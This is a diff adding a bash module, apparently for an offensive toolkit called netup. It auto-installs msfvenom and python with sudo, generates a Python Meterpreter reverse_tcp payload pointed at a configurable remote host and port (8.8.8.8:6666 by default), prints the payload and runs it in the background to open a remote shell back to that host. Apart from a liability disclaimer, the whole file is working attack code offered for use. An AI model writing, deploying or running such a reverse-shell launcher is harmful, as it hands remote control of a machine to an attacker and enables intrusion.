@@ -1,0 +1,73 @@
+#!/usr/bin/env bash
+DIR=$HOME/netup/modules
+# DISCLAIMER:
+# PLEASE DO NOT... DO NOT... I REPEAT... DO... NOT... USE THIS FOR
+# MALICIOUS PURPOSES OR MALINTENT. I,(-REDD- or Private-Locker)
+# AM NOT LIABLE FOR ANY DAMAGES OR TROUBLE YOU GET INTO BY USING
+# THIS "Module".
+#
+# IF YOU DO NOT KNOW HOW TO USE THIS MODULE, YOU PROBABLY SHOULD
+# NOT BE USING IT.
+#
+# This script requires you to have msfvenom and python installed.
+# The script will autoinstall them for you, but you will need to change
+# HOST and PORT
+#
+#  -REDD-
+
+HOST=8.8.8.8
+PORT=6666
+
+# Temp Tunnel will automatically remove old tunnel file, and remake
+# a new tunnel file every time. Set this to NO to detect old tunnel file.
+TEMPTUNNEL=YES
+
+mod_noti "Checking for needed software..";
+if ! command_exists msfvenom ; then
+       print_notification "Attempting to install msfvenom..";
+       sudo -k apt-get install -y msfvenom
+       check_success;
+fi
+if ! command_exists python ; then
+       print_notification "Attempting to install python..";
+       sudo -k apt-get install -y python
+       check_success;
+fi
+echo -e "";
+if [[ "$TEMPTUNNEL" == "YES" ]] ; then
+       mod_checkg "Temporary Tunnel is ACTIVE..";
+       if [ ! -f "$DIR/tunnel.py" ]; then
+                mod_error "No Tunnel to remove.";
+       else
+                mod_noti "Removing old copy of tunnel.py..";
+                rm -rf $DIR/tunnel.py
+       fi
+else
+        mod_status "Temporary Tunnel is DEACTIVE..";
+fi
+echo -e "";
+if [ ! -f "$DIR/tunnel.py" ]; then
+        mod_noti "Creating Tunnel to execute on Local System to $HOST.";
+        mod_error " --> This Process can take a few minutes.. <--";
+        msfvenom -p python/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -a python --platform python -f raw -o $DIR/tunnel.py > /dev/null 2>&1 &
+        BACK_PID=$!
+        printf "\x20\x20\x20\x20\x1B[01;34m[\x3E]\x1B[0m Please Wait."
+        while kill -0 $BACK_PID > /dev/null 2>&1 ; do
+                printf "."
+                sleep 1
+        done
+        echo -e "";
+        mod_checkg "Completed!";
+else
+        mod_noti "Using old tunnel.py.."
+        mod_noti "Location: $DIR/tunnel.py"
+        mod_error " -- REMOVE OLD $DIR/tunnel.py TO CREATE NEW TUNNEL --";
+fi
+echo -e "";
+mod_noti "Showing content of tunnel.py.. ->";
+PRINTCONTENT=$(cat $DIR/tunnel.py)
+echo -e "$PRINTCONTENT";
+echo -e "";
+mod_noti "Executing Tunnel..";
+/usr/bin/python $DIR/tunnel.py &
+mod_checkg "Tunnel has started back to $HOST on port $PORT.";
